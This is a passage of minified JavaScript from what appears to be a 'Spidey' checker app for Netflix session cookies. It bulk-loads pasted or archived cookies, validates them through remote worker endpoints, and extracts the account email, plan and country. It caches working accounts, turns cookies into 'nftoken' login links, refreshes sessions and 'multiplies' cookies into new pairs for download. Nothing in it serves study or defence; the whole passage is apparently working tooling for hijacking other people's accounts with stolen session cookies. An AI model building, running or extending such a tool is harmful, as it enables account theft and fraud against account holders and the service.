    const p = (crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${Math.random().toString(36).slice(2)}`).replace(/-/g, "");
    return localStorage.setItem(y0, p),
      p
  } catch {
    return "unknown-device"
  }
}
function formatRelativeTime(c) {
  if (!c) return "Cached";
  const p = Math.max(0, Math.floor((Date.now() - c) / 1000));
  if (p < 60) return "Just now";
  if (p < 3600) return `${Math.floor(p / 60)}m ago`;
  if (p < 86400) return `${Math.floor(p / 3600)}h ago`;
  return `${Math.floor(p / 86400)}d ago`;
}

const SPIDEY_CACHE_KEY = "spidey_validator_cache_v1";
const SPIDEY_SESSION_KEY = "spidey_session_state_v1";

class SpideyCacheEngine {
  constructor() {
    this.cache = new Map();
    this.hits = 0;
    this.misses = 0;
    this.maxEntries = 5000;
    this.init();
  }
  init() {
    try {
      const raw = localStorage.getItem(SPIDEY_CACHE_KEY);
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) {
          const now = Date.now();
          for (const item of parsed) {
            // ONLY keep working, unexpired accounts in cache. Expired accounts are immediately purged!
            if (item && item.key && item.data && item.data.status === "working" && (item.expiresAt > now || !item.expiresAt)) {
              this.cache.set(item.key, item);
            }
          }
        }
      }
    } catch {}
    this.save();
    this.updateDomHud();
  }
  updateDomHud() {
    try {
      const el = document.getElementById("spidey-cache-hud");
      if (el) {
        const s = this.getStats();
        el.textContent = `${s.total} VALID SAVED (${s.hits} HITS / ${s.hitRate}%)`;
      }
    } catch {}
  }
  save() {
    try {
      const entries = Array.from(this.cache.values());
      const now = Date.now();
      // Strictly retain only valid working cookies
      const valid = entries.filter(i => i.data?.status === "working" && (!i.expiresAt || i.expiresAt > now)).slice(-this.maxEntries);
      localStorage.setItem(SPIDEY_CACHE_KEY, JSON.stringify(valid));
    } catch {}
    this.updateDomHud();
  }
  delete(key) {
    if (!key) return;
    if (this.cache.has(key)) {
      this.cache.delete(key);
      this.save();
    }
  }
  getCookieKey(pair) {
    if (!pair || !pair.netflixId) return null;
    return "cookie:" + pair.netflixId + (pair.secureNetflixId ? "|" + pair.secureNetflixId : "");
  }
  getTokenKey(url) {
    if (!url) return null;
    const token = this.extractToken(url);
    return "nftoken:" + token;
  }
  extractToken(url) {
    if (!url) return "";
    const match = url.match(/[?&]nftoken=([^&\s]+)/);
    return match ? match[1] : (url.includes("nftoken=") ? url.split("nftoken=")[1].split("&")[0] : url.trim());
  }
  get(key) {
    if (!key) return null;
    const item = this.cache.get(key);
    if (!item) {
      this.misses++;
      this.updateDomHud();
      return null;
    }
    const now = Date.now();
    // If expired or not working, delete immediately!
    if ((item.expiresAt && item.expiresAt < now) || (item.data && item.data.status !== "working")) {
      this.delete(key);
      this.misses++;
      this.updateDomHud();
      return null;
    }
    this.hits++;
    this.updateDomHud();
    return {
      ...item.data,
      cached: true,
      cachedAt: item.timestamp
    };
  }
  set(key, data, ttlHours = 12) {
    if (!key || !data) return;
    // Expired or error cookies are immediately removed and never saved to cache
    if (data.status !== "working") {
      this.delete(key);
      return;
    }
    const now = Date.now();
    const item = {
      key,
      data: {
        status: "working",
        plan: data.plan,
        email: data.email,
        country: data.country,
        extraMembers: data.extraMembers,
        error: null,
        pair: data.pair,
        fullCookies: data.fullCookies,
        nftoken: data.nftoken
      },
      timestamp: now,
      expiresAt: ttlHours > 0 ? now + ttlHours * 3600 * 1000 : null
    };
    if (this.cache.size >= this.maxEntries) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    this.cache.set(key, item);
    this.save();
  }
  updateToken(key, token) {
    if (!key) return;
    const item = this.cache.get(key);
    if (item && item.data) {
      item.data.nftoken = token;
      this.save();
    }
  }
  clear() {
    this.cache.clear();
    this.hits = 0;
    this.misses = 0;
    try {
      localStorage.removeItem(SPIDEY_CACHE_KEY);
    } catch {}
    this.updateDomHud();
  }
  getStats() {
    const total = this.cache.size;
    const values = Array.from(this.cache.values());
    const working = values.filter(v => v.data?.status === "working").length;
    const expired = 0;
    const errors = 0;
    const totalReq = this.hits + this.misses;
    const hitRate = totalReq > 0 ? Math.round((this.hits / totalReq) * 100) : 0;
    return {
      total,
      working,
      expired,
      errors,
      hits: this.hits,
      misses: this.misses,
      hitRate
    };
  }
}
const SpideyCache = new SpideyCacheEngine();

function x0({ status: c, cached: p, cachedAt: h }) {
  const S = {
    working: {
      label: "Valid",
      cls: "bg-emerald-500/10 text-emerald-400 ring-1 ring-emerald-500/30",
      dot: "bg-emerald-400"
    },
    duplicate: {
      label: "Dupe",
      cls: "bg-amber-500/10  text-amber-400  ring-1 ring-amber-500/30",
      dot: "bg-amber-400"
    },
    expired: {
      label: "Expired",
      cls: "bg-red-500/10    text-red-400    ring-1 ring-red-500/30",
      dot: "bg-red-400"
    },
    blocked: {
      label: "Blocked",
      cls: "bg-purple-500/10 text-purple-400 ring-1 ring-purple-500/30",
      dot: "bg-purple-400"
    },
    error: {
      label: "Error",
      cls: "bg-zinc-500/10   text-zinc-400   ring-1 ring-zinc-500/30",
      dot: "bg-zinc-500"
    }
  }[c] ?? {
    label: c,
    cls: "bg-zinc-800 text-zinc-400 ring-1 ring-zinc-700",
    dot: "bg-zinc-600"
  };
  return g.jsxs("div", {
    className: "inline-flex items-center gap-1.5 flex-wrap",
    children: [
      g.jsxs("span", {
        className: ye("inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[10px] font-medium uppercase tracking-wide", S.cls),
        children: [g.jsx("span", {
          className: ye("w-1.5 h-1.5 rounded-full flex-shrink-0", S.dot)
        }), S.label]
      }),
      p ? g.jsxs("span", {
        title: h ? `Cached ${formatRelativeTime(h)}` : "Served from Spidey-Cache",
        className: "inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-full text-[9px] font-bold bg-amber-400/15 text-amber-300 ring-1 ring-amber-400/30 shadow-[0_0_8px_rgba(251,191,36,0.2)]",
        children: [
          g.jsx(Zh_zap, { size: 9, className: "text-amber-300" }),
          "CACHED"
        ]
      }) : null
    ]
  });
}
function xi({ label: c, value: p, color: h, icon: r, glow: S }) {
  return g.jsxs("div", {
    className: ye("flex flex-col gap-1 p-3 sm:p-4 rounded-xl border bg-[#0d0d0d] transition-all", S ? "border-emerald-500/25 shadow-[0_0_20px_rgba(52,211,153,0.06)]" : "border-zinc-800"),
    children: [g.jsxs("div", {
      className: "flex items-center justify-between",
      children: [g.jsx("span", {
        className: "text-[10px] text-zinc-500 uppercase tracking-widest",
        children: c
      }), r && g.jsx(r, {
        size: 13,
        className: h ?? "text-zinc-600"
      })]
    }), g.jsx("span", {
      className: ye("text-2xl font-bold tabular-nums", h ?? "text-zinc-300"),
      children: p.toLocaleString()
    })]
  })
}
function S0({ checked: c, onChange: p, label: h }) {
  return g.jsxs("button", {
    type: "button",
    onClick: () => p(!c),
    className: "flex items-center gap-2.5 group focus:outline-none",
    children: [g.jsx("span", {
      className: ye("relative inline-flex h-5 w-9 rounded-full transition-colors flex-shrink-0", c ? "bg-emerald-500" : "bg-zinc-700"),
      children: g.jsx("span", {
        className: ye("absolute top-0.5 left-0.5 h-4 w-4 rounded-full bg-white shadow transition-transform", c ? "translate-x-4" : "translate-x-0")
      })
    }), g.jsx("span", {
      className: ye("text-xs font-medium tracking-wide", c ? "text-zinc-200" : "text-zinc-500 group-hover:text-zinc-400"),
      children: h
    })]
  })
}
function cr(c, p) {
  switch (p) {
    case "mobile":
      return `https://netflix.com/unsupported?nftoken=${c}`;
    case "tv":
      return `https://netflix.com/tv8?nftoken=${c}`;
    default:
      return `https://netflix.com/?nftoken=${c}`
  }
}
const Yg = `# Paste cookie payload here...
# Accepted formats: JSON Array, Netscape, Raw K/V
#
# [{"name":"NetflixId","value":"abc123",...}]
# .netflix.com TRUE / TRUE 0 NetflixId abc123
#
# Waiting for input...`;
function Gg() {
  const savedSession = (() => {
    try {
      const raw = localStorage.getItem(SPIDEY_SESSION_KEY);
      return raw ? JSON.parse(raw) : null;
    } catch {
      return null;
    }
  })();

  const [c, p] = G.useState("cookies")
    , [h, r] = G.useState("")
    , [S, R] = G.useState(null)
    , [A, q] = G.useState(!1)
    , [k, y] = G.useState(!1)
    , [C, $] = G.useState(savedSession?.payload || "")
    , [tt, St] = G.useState(!1)
    , [Yt, zt] = G.useState(!1)
    , [Rt, re] = G.useState(() => localStorage.getItem("spidey_filter_dupes") === "true")
    , [Tt, Gt] = G.useState(() => localStorage.getItem("spidey_nftoken_gen") === "true")
    , [cacheEnabled, setCacheEnabled] = G.useState(() => localStorage.getItem("spidey_cache_enabled") !== "false")
    , [cacheTtl, setCacheTtl] = G.useState(() => Number(localStorage.getItem("spidey_cache_ttl")) || 12)
    , [cacheStats, setCacheStats] = G.useState(() => SpideyCache.getStats())
    , [showCacheMenu, setShowCacheMenu] = G.useState(!1)
    , [Zt, ot] = G.useState(() => {
      const d = localStorage.getItem("nftoken_device");
      return d === "mobile" || d === "pc" || d === "tv" ? d : "pc"
    })
    , [Dt, Mt] = G.useState({
      current: savedSession?.results?.length || 0,
      total: savedSession?.results?.length || 0
    })
    , [D, st] = G.useState(savedSession?.results || [])
    , [$e, xe] = G.useState([])
    , [Qt, Te] = G.useState(!1)
    , [je, qt] = G.useState(null)
    , [T, w] = G.useState(null)
    , [W, yt] = G.useState(ir)
    , [o, O] = G.useState("00:00")
    , [X, B] = G.useState(3)
    , [J, lt] = G.useState("3")
    , [V, Jt] = G.useState(!1)
    , [_t, Ot] = G.useState(!1)
    , [planFilter, setPlanFilter] = G.useState(savedSession?.planFilter || "all")
    , hl = G.useRef(null)
    , _e = G.useRef(Bg())
    , ll = G.useRef(0)
    , Q = G.useRef(savedSession?.results || [])
    , Se = G.useRef(!1)
    , We = G.useRef([])
    , xn = G.useRef(Rt)
    , Ee = G.useRef(Tt)
    , Ca = G.useRef("pc")
    , gl = G.useRef(new Set)
    , al = G.useRef(null)
    , Fe = G.useRef(0)
    , oe = G.useRef(null)
    , Ua = G.useRef(0)
    , cacheEnabledRef = G.useRef(cacheEnabled)
    , cacheTtlRef = G.useRef(cacheTtl);

  // Sync ref values
  cacheEnabledRef.current = cacheEnabled;
  cacheTtlRef.current = cacheTtl;
  xn.current = Rt;
  Ee.current = Tt;
  Ca.current = Zt;

  // Persist session state debounced
  G.useEffect(() => {
    const timer = setTimeout(() => {
      try {
        localStorage.setItem(SPIDEY_SESSION_KEY, JSON.stringify({
          payload: C,
          results: D,
          planFilter: planFilter
        }));
      } catch {}
    }, 600);
    return () => clearTimeout(timer);
  }, [C, D, planFilter]);

  // Persist settings
  G.useEffect(() => {
    try {
      localStorage.setItem("spidey_cache_enabled", String(cacheEnabled));
    } catch {}
  }, [cacheEnabled]);

  G.useEffect(() => {
    try {
      localStorage.setItem("spidey_cache_ttl", String(cacheTtl));
    } catch {}
  }, [cacheTtl]);

  G.useEffect(() => {
    try {
      localStorage.setItem("spidey_filter_dupes", String(Rt));
    } catch {}
  }, [Rt]);

  G.useEffect(() => {
    try {
      localStorage.setItem("spidey_nftoken_gen", String(Tt));
    } catch {}
  }, [Tt]);

  const refreshCacheStats = G.useCallback(() => {
    setCacheStats(SpideyCache.getStats());
  }, []);

  G.useEffect(() => {
    if (!tt)
      return;
    al.current = Date.now(),
      O(ur(Fe.current));
    const d = setInterval(() => {
      O(ur(Fe.current + (Date.now() - (al.current || Date.now()))))
    }
      , 1e3);
    return () => {
      clearInterval(d),
        al.current != null && (Fe.current += Date.now() - al.current,
          al.current = null,
          O(ur(Fe.current)))
    }
  }
    , [tt]);

  const rt = G.useCallback((d, U = "info") => {
    const H = ++ll.current;
    xe(j => [...j, {
      id: H,
      message: d,
      type: U
    }]),
      setTimeout(() => xe(j => j.filter(Y => Y.id !== H)), 4e3)
  }
    , [])
    , nl = G.useCallback((d, U) => {
      const H = [];
      return U && H.push({
        domain: ".netflix.com",
        expirationDate: 1e16,
        hostOnly: !1,
        httpOnly: !0,
        name: "SecureNetflixId",
        path: "/",
        sameSite: "strict",
        secure: !0,
        session: !1,
        storeId: null,
        value: U
      }),
        H.push({
          domain: ".netflix.com",
          expirationDate: 1e16,
          hostOnly: !1,
          httpOnly: !0,
          name: "NetflixId",
          path: "/",
          sameSite: "lax",
          secure: !0,
          session: !1,
          storeId: null,
          value: d
        }),
        JSON.stringify(H)
    }
      , [])
    , vl = G.useCallback(d => {
      const U = new Set(["NetflixId", "SecureNetflixId", "memclid", "nfvdid"])
        , H = new Set(["SecureNetflixId"])
        , j = d.map(({ name: Y, value: F }) => ({
          domain: ".netflix.com",
          expirationDate: 1e16,
          hostOnly: !1,
          httpOnly: U.has(Y),
          name: Y,
          path: "/",
          sameSite: H.has(Y) ? "strict" : "lax",
          secure: !0,
          session: !1,
          storeId: null,
          value: F
        }));
      return JSON.stringify(j)
    }
      , [])
    , ze = G.useCallback(d => {
      const U = d.find(j => j.name === "NetflixId")?.value || ""
        , H = d.find(j => j.name === "SecureNetflixId")?.value;
      U && navigator.clipboard.writeText(nl(U, H)).then(() => {
        y(!0),
          setTimeout(() => y(!1), 2e3)
      }
      )
    }
      , [nl])
    , il = G.useCallback(async () => {
      if (h.trim()) {
        q(!0),
          R(null);
        try {
          if (cacheEnabledRef.current) {
            const cacheKey = SpideyCache.getTokenKey(h);
            const cached = SpideyCache.get(cacheKey);
            if (cached) {
              R({
                status: cached.status,
                cookies: cached.fullCookies || (cached.pair?.netflixId ? dh(cached.pair) : []),
                details: {
                  plan: cached.plan,
                  email: cached.email,
                  country: cached.country,
                  extraMembers: cached.extraMembers
                },
                nftoken: cached.nftoken || SpideyCache.extractToken(h),
                cached: true,
                cachedAt: cached.cachedAt
              });
              refreshCacheStats();
              rt("Resolved instantly from Spidey-Cache!", "success");
              q(!1);
              return;
            }
          }

          const U = h.trim();
          const H = U.match(/[?&]nftoken=([^&\s]+)/);
          const j = H ? `https://netflix.com/?nftoken=${H[1]}` : U;
          const rawToken = H ? H[1] : (U.includes("nftoken=") ? U.split("nftoken=")[1].split("&")[0] : U);

          const maxAttempts = Math.min(ul, Math.max(1, sr()));
          let F = null;
          for (let i = 0; i < maxAttempts; i++) {
            const worker = ph();
            const ac = new AbortController();
            const timer = setTimeout(() => ac.abort(), ma);
            try {
              const res = await fetch(`${worker}/api/check-token`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  url: j,
                  deviceId: _e.current
                }),
                signal: ac.signal
              });
              clearTimeout(timer);
              F = await res.json();
              if (F && (F.status === "working" || F.status === "expired")) break;
            } catch (err) {
              clearTimeout(timer);
            }
          }

          if (!F) {
            throw new Error("Unable to reach validator workers");
          }

          F.nftoken = rawToken;

          if (cacheEnabledRef.current) {
            if (F.status === "working") {
              const pair = {
                netflixId: F.cookies?.find(Ae => Ae.name === "NetflixId")?.value || "",
                secureNetflixId: F.cookies?.find(Ae => Ae.name === "SecureNetflixId")?.value || ""
              };
              SpideyCache.set(SpideyCache.getTokenKey(h), {
                status: F.status,
                plan: F.details?.plan || "-",
                email: F.details?.email || "-",
                country: F.details?.country || "-",
                extraMembers: F.details?.extraMembers ?? null,
                error: F.error || null,
                pair: pair,
                fullCookies: F.cookies,
                nftoken: rawToken
              }, cacheTtlRef.current);
            } else {
              SpideyCache.delete(SpideyCache.getTokenKey(h));
            }
            refreshCacheStats();
          }

          R(F);
        } catch (d) {
          R({
            status: "error",
            cookies: [],
            error: d instanceof Error ? d.message : "Network error"
          })
        } finally {
          q(!1)
        }
      }
    }
      , [h, refreshCacheStats, rt])
    , fe = G.useCallback(async d => {
      if (!d.length)
        return;
      const U = [];
      let H = 0
        , j = 0;
      for (const F of d) {
        const ft = F.name.toLowerCase();
        if (ft.endsWith(".zip") || ft.endsWith(".rar"))
          try {
            const I = await F.arrayBuffer()
              , et = await fetch(`${Dl(1)[0]}/api/extract-archive`, {
                method: "POST",
                headers: {
                  "Content-Type": ft.endsWith(".rar") ? "application/x-rar-compressed" : "application/zip",
                  "X-Filename": encodeURIComponent(F.name)
                },
                body: I
              })
              , at = await et.json();
            if (!et.ok || at.error) {
              rt(`${F.name}: ${at.error || "Extraction failed"}`, "error");
              continue
            }
            at.text && (U.push(at.text),
              H += at.count ?? 0)
          } catch (I) {
            rt(`${F.name}: ${I instanceof Error ? I.message : "Extraction failed"}`, "error")
          }
        else
          try {
            const I = await F.text();
            U.push(I),
              j++
          } catch {
            rt(`${F.name}: Failed to read`, "error")
          }
      }
      if (!U.length)
        return;
      $(F => F ? F.trimEnd() + "\n" + U.join("\n") : U.join("\n"));
      const Y = [];
      j && Y.push(`${j} file(s)`),
        H && Y.push(`${H} archive file(s) extracted`),
        rt(`Loaded: ${Y.join(", ")}`, "success")
    }
      , [rt])
    , Bu = G.useCallback(d => {
      d.preventDefault(),
        Te(!1),
        fe(Array.from(d.dataTransfer.files))
    }
      , [fe])
    , Yu = G.useCallback(d => {
      const U = d.fullCookies?.length ? vl(d.fullCookies) : nl(d.pair.netflixId, d.pair.secureNetflixId);
      navigator.clipboard.writeText(U).then(() => {
        qt(d.id),
          rt(`Cookie #${d.id} copied`, "success"),
          setTimeout(() => qt(null), 2e3)
      }
      ).catch(() => rt("Copy failed", "error"))
    }
      , [rt, nl, vl])
    , Gu = G.useCallback(d => {
      d.nftoken && navigator.clipboard.writeText(cr(d.nftoken, Ca.current)).then(() => {
        w(d.id),
          rt("NFToken copied", "success"),
          setTimeout(() => w(null), 2e3)
      }
      ).catch(() => rt("Copy failed", "error"))
    }
      , [rt])
    , generateTokenForPair = G.useCallback(async (pair, fullCookies) => {
      if (!pair || !pair.netflixId || pair.netflixId.startsWith("__nftoken__")) return null;
      const maxAttempts = Math.min(3, Math.max(1, sr()));
      const cookieList = fullCookies?.length ? fullCookies : [
        { name: "NetflixId", value: pair.netflixId },
        ...(pair.secureNetflixId ? [{ name: "SecureNetflixId", value: pair.secureNetflixId }] : [])
      ];
      for (let i = 0; i < maxAttempts; i++) {
        const worker = ph();
        const ac = new AbortController();
        const timer = setTimeout(() => ac.abort(), 9000);
        try {
          const res = await fetch(`${worker}/api/generate-nftoken`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              netflixId: pair.netflixId,
              secureNetflixId: pair.secureNetflixId
            }),
            signal: ac.signal
          });
          clearTimeout(timer);
          const data = await res.json();
          if (data && data.token) {
            return { token: data.token, pair, fullCookies: cookieList };
          }
          // If direct generation failed, attempt session refresh then re-generate
          const refRes = await fetch(`${worker}/api/refresh-session`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cookies: cookieList }),
            signal: ac.signal
          });
          const refData = await refRes.json();
          if (refData && Array.isArray(refData.cookies) && refData.cookies.length) {
            const newNid = refData.cookies.find(c => c.name === "NetflixId")?.value || pair.netflixId;
            const newSnid = refData.cookies.find(c => c.name === "SecureNetflixId")?.value || pair.secureNetflixId;
            const newPair = { netflixId: newNid, secureNetflixId: newSnid };
            const gen2 = await (await fetch(`${worker}/api/generate-nftoken`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ netflixId: newNid, secureNetflixId: newSnid }),
              signal: ac.signal
            })).json();
            if (gen2 && gen2.token) {
              return { token: gen2.token, pair: newPair, fullCookies: refData.cookies };
            }
          }
        } catch (e) {
          clearTimeout(timer);
        }
      }
      return null;
    }, [])
    , wa = G.useCallback(async d => {
      if (!d.pair.netflixId || d.status !== "working") {
        rt("Cannot generate NFToken for non-working account", "error");
        return;
      }
      Q.current = Q.current.map(j => j.id === d.id ? {
        ...j,
        nftoken: "__pending__"
      } : j),
        st([...Q.current]);
      try {
        const res = await generateTokenForPair(d.pair, d.fullCookies);
        if (res && res.token) {
          Q.current = Q.current.map(ut => ut.id === d.id ? {
            ...ut,
            pair: res.pair || ut.pair,
            fullCookies: res.fullCookies || ut.fullCookies,
            nftoken: res.token
          } : ut);
          st([...Q.current]);
          if (cacheEnabledRef.current) {
            SpideyCache.updateToken(SpideyCache.getCookieKey(res.pair || d.pair), res.token);
            refreshCacheStats();
          }
          rt("NFToken generated successfully", "success");
        } else {
          Q.current = Q.current.map(ut => ut.id === d.id ? {
            ...ut,
            nftoken: "__failed__"
          } : ut);
          st([...Q.current]);
          rt("NFToken generation failed", "error");
        }
      } catch (j) {
        Q.current = Q.current.map(Y => Y.id === d.id ? {
          ...Y,
          nftoken: "__failed__"
        } : Y);
        st([...Q.current]);
        rt(j instanceof Error ? j.message : "Retry failed", "error");
      }
    }, [generateTokenForPair, refreshCacheStats, rt])
    , Ha = G.useCallback(async () => {
      const d = Q.current.filter(I => I.status === "working");
      if (d.length === 0)
        return;
      Jt(!0),
        rt(`Multiplying ${d.length} account(s) × ${X}…`, "info");
      const U = Dl(1)[0]
        , H = [];
      let j = 0
        , Y = 0;
      for (const I of d)
        try {
          const et = I.fullCookies?.length ? I.fullCookies : [{
            name: "NetflixId",
            value: I.pair.netflixId
          }, ...I.pair.secureNetflixId ? [{
            name: "SecureNetflixId",
            value: I.pair.secureNetflixId
          }] : []]
            , ut = await (await fetch(`${U}/api/multiply-cookies`, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                cookies: et,
                copies: X
              })
            })).json();
          for (const te of ut.results)
            if (te.netflixId) {
              const ee = [];
              te.secureNetflixId && ee.push({
                domain: ".netflix.com",
                expirationDate: 1e16,
                hostOnly: !1,
                httpOnly: !0,
                name: "SecureNetflixId",
                path: "/",
                sameSite: "strict",
                secure: !0,
                session: !1,
                storeId: null,
                value: te.secureNetflixId
              }),
                ee.push({
                  domain: ".netflix.com",
                  expirationDate: 1e16,
                  hostOnly: !1,
                  httpOnly: !0,
                  name: "NetflixId",
                  path: "/",
                  sameSite: "lax",
                  secure: !0,
                  session: !1,
                  storeId: null,
                  value: te.netflixId
                }),
                H.push(JSON.stringify(ee)),
                j++
            } else
              Y++
        } catch {
          Y += X
        }
      if (Jt(!1),
        j === 0) {
        rt(`Multiply failed — ${Y} error(s).`, "error");
        return
      }
      const F = new Blob([H.join("\n")], {
        type: "text/plain"
      })
        , ft = URL.createObjectURL(F)
        , bt = document.createElement("a");
      bt.href = ft,
        bt.download = `multiplied_${j}.txt`,
        bt.click(),
        URL.revokeObjectURL(ft),
        rt(`Done — ${j} new pair(s) downloaded${Y ? `, ${Y} failed` : ""}.`, "success")
    }
      , [X, rt])
    , ul = 2
    , ma = 22e3
    , Ul = G.useCallback(async (d, U) => {
      if (cacheEnabledRef.current) {
        const cacheKey = SpideyCache.getTokenKey(d);
        const cached = SpideyCache.get(cacheKey);
        if (cached) {
          return {
            id: U + 1,
            status: cached.status || "error",
            plan: cached.plan || "-",
            email: cached.email || "-",
            country: cached.country || "-",
            extraMembers: cached.extraMembers ?? null,
            error: cached.error || null,
            pair: cached.pair || { netflixId: `__nftoken__${U}` },
            fullCookies: cached.fullCookies,
            nftoken: cached.nftoken || SpideyCache.extractToken(d),
            cached: true,
            cachedAt: cached.cachedAt
          };
        }
      }

      const H = d.match(/[?&]nftoken=([^&\s]+)/)
        , j = H ? `https://netflix.com/?nftoken=${H[1]}` : d
        , rawToken = H ? H[1] : (d.includes("nftoken=") ? d.split("nftoken=")[1].split("&")[0] : d)
        , Y = Dl(Math.min(ul, Math.max(1, sr())));
      let F = null;
      for (const ft of Y) {
        const bt = new AbortController
          , I = setTimeout(() => bt.abort(), ma);
        try {
          const et = await fetch(`${ft}/api/check-token`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              url: j,
              deviceId: _e.current
            }),
            signal: bt.signal
          });
          clearTimeout(I);
          const at = await et.json()
            , ut = at.cookies?.find(Ae => Ae.name === "NetflixId")?.value || ""
            , te = at.cookies?.find(Ae => Ae.name === "SecureNetflixId")?.value || ""
            , ee = {
              netflixId: ut || `__nftoken__${U}`,
              secureNetflixId: te || void 0
            }
            , bl = at.cookies?.length ? at.cookies : void 0
            , Et = {
              id: U + 1,
              status: at.status || "error",
              plan: at.details?.plan || "-",
              email: at.details?.email || "-",
              country: at.details?.country || "-",
              extraMembers: at.details?.extraMembers ?? null,
              error: at.error || null,
              pair: ee,
              fullCookies: bl,
              nftoken: rawToken
            };
          if (Et.status === "working") {
            if (cacheEnabledRef.current) {
              SpideyCache.set(SpideyCache.getTokenKey(d), Et, cacheTtlRef.current);
            }
            return Et;
          }
          if (Et.status === "expired" || Et.status === "error") {
            if (cacheEnabledRef.current) {
              SpideyCache.delete(SpideyCache.getTokenKey(d));
            }
            return Et;
          }
          F = Et
        } catch (et) {
          clearTimeout(I),
            F = {
              id: U + 1,
              status: "error",
              plan: "-",
              email: "-",
              country: "-",
              extraMembers: null,
              error: et instanceof Error ? et.name === "AbortError" ? "Timeout" : et.message : "Unknown error",
              pair: {
                netflixId: `__nftoken__${U}`
              },
              nftoken: rawToken
            }
        }
      }
      return F
    }
      , [])
    , qa = G.useCallback(async (d, U) => {
      if (cacheEnabledRef.current) {
        const cacheKey = SpideyCache.getCookieKey(d);
        const cached = SpideyCache.get(cacheKey);
        if (cached) {
          return {
            id: U + 1,
            status: cached.status || "error",
            plan: cached.plan || "-",
            email: cached.email || "-",
            country: cached.country || "-",
            extraMembers: cached.extraMembers ?? null,
            error: cached.error || null,
            pair: d,
            fullCookies: cached.fullCookies,
            nftoken: cached.nftoken,
            cached: true,
            cachedAt: cached.cachedAt
          };
        }
      }

      const H = Math.min(ul, Math.max(1, sr()))
        , j = new Set
        , Y = [];
      for (let ft = 0; ft < H; ft++) {
        const bt = ph();
        j.has(bt) || (j.add(bt),
          Y.push(bt))
      }
      Y.length === 0 && Y.push("");
      let F = null;
      for (const ft of Y) {
        const bt = new AbortController
          , I = setTimeout(() => bt.abort(), ma);
        try {
          const et = await fetch(`${ft}/api/check`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              cookies: dh(d),
              deviceId: _e.current
            }),
            signal: bt.signal
          });
          clearTimeout(I);
          const at = await et.json()
            , ut = {
              id: U + 1,
              status: at.status || "error",
              plan: at.details?.plan || "-",
              email: at.details?.email || "-",
              country: at.details?.country || "-",
              extraMembers: at.details?.extraMembers ?? null,
              error: at.error || null,
              pair: d,
              fullCookies: at.cookies || null,
              nftoken: at.nftoken || at.token || null
            };
          if (ut.status === "working") {
            if (cacheEnabledRef.current) {
              SpideyCache.set(SpideyCache.getCookieKey(d), ut, cacheTtlRef.current);
            }
            return ut;
          }
          if (ut.status === "expired" || ut.status === "error") {
            if (cacheEnabledRef.current) {
              SpideyCache.delete(SpideyCache.getCookieKey(d));
            }
            return ut;
          }
          F = ut
        } catch (et) {
          clearTimeout(I),
            F = {
              id: U + 1,
              status: "error",
              plan: "-",
              email: "-",
              country: "-",
              extraMembers: null,
              error: et instanceof Error ? et.name === "AbortError" ? "Timeout" : et.message : "Unknown error",
              pair: d
            }
        }
      }
      return F
    }
      , []);

  const zi = G.useCallback(d => {
    ot(d),
      localStorage.setItem("nftoken_device", d)
  }
    , [])
    , Sn = G.useCallback(async () => {
      const d = Q.current.filter(j => j.status === "working" && j.pair.netflixId && !j.pair.netflixId.startsWith("__nftoken__"));
      if (d.length === 0) {
        rt("No valid working accounts to generate NFTokens for", "info");
        return;
      }
      Q.current = Q.current.map(j => j.status === "working" && j.pair.netflixId && !j.pair.netflixId.startsWith("__nftoken__") ? {
        ...j,
        nftoken: "__pending__"
      } : j),
        st([...Q.current]),
        Ot(!0);

      const CONCURRENCY = 6;
      let idx = 0;
      let completed = 0;

      async function worker() {
        while (idx < d.length) {
          const item = d[idx++];
          try {
            const res = await generateTokenForPair(item.pair, item.fullCookies);
            const tok = res?.token || "__failed__";
            Q.current = Q.current.map(et => et.id === item.id ? {
              ...et,
              pair: res?.pair || et.pair,
              fullCookies: res?.fullCookies || et.fullCookies,
              nftoken: tok
            } : et);
            st([...Q.current]);
            if (cacheEnabledRef.current && res?.token) {
              SpideyCache.updateToken(SpideyCache.getCookieKey(res.pair || item.pair), res.token);
              refreshCacheStats();
            }
          } catch {
            Q.current = Q.current.map(et => et.id === item.id ? {
              ...et,
              nftoken: "__failed__"
            } : et);
            st([...Q.current]);
          } finally {
            completed++;
            if (completed === d.length) {
              Ot(!1);
              const successCount = Q.current.filter(j => j.status === "working" && j.nftoken && j.nftoken !== "__failed__" && j.nftoken !== "__pending__").length;
              rt(`NFToken Gen complete (${successCount}/${d.length} generated)`, "success");
            }
          }
        }
      }

      const workers = Array.from({ length: Math.min(CONCURRENCY, d.length) }, () => worker());
      await Promise.all(workers);
    }, [generateTokenForPair, refreshCacheStats, rt]);

  G.useEffect(() => {
    Tt && Sn()
  }
    , [Tt]);

  const zn = G.useCallback(() => {
    Se.current = !0,
      rt("Stopping after current batch…", "info")
  }
    , [rt])
    , cl = G.useCallback(async d => {
      if (d.length === 0)
        return;
      let U = 0;
      await new Promise(H => {
        let j = 0
          , Y = 0;
        function F(I) {
          if (xn.current && I.status === "working" && I.email !== "-") {
            const et = I.email.trim().toLowerCase();
            if (gl.current.has(et))
              return {
                ...I,
                status: "duplicate"
              };
            gl.current.add(et)
          }
          return I
        }
        function ft(I, et) {
          const at = F(I);
          U++;
          Y--;
          Q.current = Q.current.map(ut => ut.id === et ? {
            ...at,
            id: et
          } : ut);
          st([...Q.current]);

          if (Ee.current && at.status === "working" && at.pair.netflixId && !at.pair.netflixId.startsWith("__nftoken__")) {
            const ut = at.id;
            Q.current = Q.current.map(Et => Et.id === ut ? {
              ...Et,
              nftoken: "__pending__"
            } : Et);
            st([...Q.current]);
            generateTokenForPair(at.pair, at.fullCookies).then(res => {
              const Ae = res?.token || "__failed__";
              Q.current = Q.current.map(Ie => Ie.id === ut ? {
                ...Ie,
                pair: res?.pair || Ie.pair,
